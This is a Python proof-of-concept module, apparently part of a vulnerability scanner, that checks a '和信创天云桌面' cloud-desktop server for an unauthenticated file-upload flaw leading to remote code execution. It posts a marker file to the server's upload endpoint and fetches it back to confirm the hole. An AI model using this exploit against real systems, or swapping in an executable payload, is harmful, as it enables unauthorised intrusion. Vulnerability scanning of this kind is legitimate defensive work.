# -*- coding:utf-8 -*-
# 和信创天云桌面_RCE

from .. import fileUtil
from ..requestClass import Requests
from ServiceScanModel.models import ServiceScan
import traceback




class POC:
    def __init__(self, service: ServiceScan):
        self.service = service
        self.requestUtil= Requests(service.cookies)
        self.result = False

    def upload_file(self, url, filename="passer.txt", filedata="passer-W"):
        data = self.requestUtil.get_file_data(filename, filedata)
        print(data)
        resp = self.requestUtil.post(url + "/Upload/upload_file.php?l=1", data=data[0], header={"Content-Type": data[1]})
        resp = self.requestUtil.get(url + "/Upload/1/%s" % filename)
        print(resp.text)
        if resp.status_code == 200:
            return url + "/Upload/1/%s" % filename
        else:
            return False

    def fingerprint(self):
        try:
            if self.service.url:
                resp = self.requestUtil.get(self.service.url)
                if "vesystem" in resp.text:
                    return True
        except:
            return False

    def poc(self):
        try:
            result = self.upload_file(self.service.url)
            if result:
                return ["和信创天云桌面_RCE", "Path: %s<br>Content: %s" % ("/Upload/1/passer.txt", "passer-W")]
        except:
            traceback.print_exc()
            return []
